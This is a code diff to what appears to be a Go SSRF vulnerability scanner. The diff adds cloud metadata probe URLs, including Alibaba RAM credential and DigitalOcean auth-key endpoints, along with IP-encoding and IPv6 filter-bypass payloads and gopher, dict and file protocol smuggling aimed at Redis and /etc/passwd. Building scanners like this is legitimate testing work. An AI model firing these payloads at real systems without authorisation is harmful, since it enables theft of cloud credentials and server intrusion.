@@ -161,7 +161,22 @@ func (p *SSRFProber) testSSRFViaURLParams(cfg *ProberConfig, endpoints []types.E
 			"http://100.100.100.200/latest/meta-data/",
 			"Alibaba Cloud Metadata",
 			[]string{"instance-id", "region-id", "hostname"},
-			nil,
+			[]string{
+				"http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+				"http://100.100.100.200/latest/meta-data/instance-id",
+			},
+			"Critical",
+		},
+		{
+			"http://169.254.169.254/metadata/v1/",
+			"DigitalOcean Droplet Metadata",
+			[]string{"droplet_id", "hostname", "region", "interfaces", "dns", "floating_ip"},
+			[]string{
+				"http://169.254.169.254/metadata/v1/id",
+				"http://169.254.169.254/metadata/v1/hostname",
+				"http://169.254.169.254/metadata/v1/auth-key",
+				"http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address",
+			},
 			"Critical",
 		},
 		{
@@ -203,6 +218,15 @@ func (p *SSRFProber) testSSRFViaURLParams(cfg *ProberConfig, endpoints []types.E
 		{"http://0/", "zero IP bypass"},
 		{"http://localtest.me/", "DNS rebinding (localtest.me)"},
 		{"http://spoofed.burpcollaborator.net/", "DNS rebinding"},
+		// URL-encoded IP bypass
+		{"http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/latest/meta-data/", "URL-encoded IP bypass"},
+		// IPv6 mapped address
+		{"http://[::ffff:169.254.169.254]/latest/meta-data/", "IPv6 mapped address bypass"},
+		{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "IPv6 hex mapped bypass"},
+		// Protocol smuggling — these work when the server uses a library that supports them
+		{"gopher://127.0.0.1:6379/_INFO%0d%0a", "Gopher protocol SSRF (Redis)"},
+		{"dict://127.0.0.1:6379/info", "Dict protocol SSRF (Redis)"},
+		{"file:///etc/passwd", "File protocol LFI via SSRF"},
 	}
 
 	for _, ep := range endpoints {
